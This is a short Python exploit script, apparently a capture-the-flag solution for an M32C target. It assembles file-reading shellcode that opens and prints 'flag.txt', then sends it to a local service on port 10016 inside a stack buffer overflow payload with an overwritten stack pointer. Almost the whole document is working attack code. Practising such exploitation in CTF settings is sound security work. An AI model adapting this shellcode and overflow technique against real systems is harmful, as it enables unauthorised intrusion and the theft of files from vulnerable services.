asm = '''.section .text
.global _start
.ascii "%s"
_start:
    jmp.w get_addr
ret:
    pop.w r3
open:
    mov.w r3, r1
    xor.w r2, r2
    mov.w:q	#2, r0
    mov.w:g	r0, 0x400
read:
    mov.w r0, r1
    mov.w r3, r2
    push.w:g #0x7f
    mov.w:q	#4, r0
    mov.w:g	r0, 0x400
write:
    mov.w #1, r1
    mov.w r3, r2
    push.w:g #0x7f
    mov.w:q	#5, r0
    mov.w:g	r0, 0x400
    jmp.w write
get_addr:
    jsr.w ret
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'm32c'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10016
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x1b0b
shellcode = 'AAAAAAAAAAAAAAAAAA' + p16(SP) +'\x00' + shellcode + '\n'
sl(s, shellcode)
shell(s)
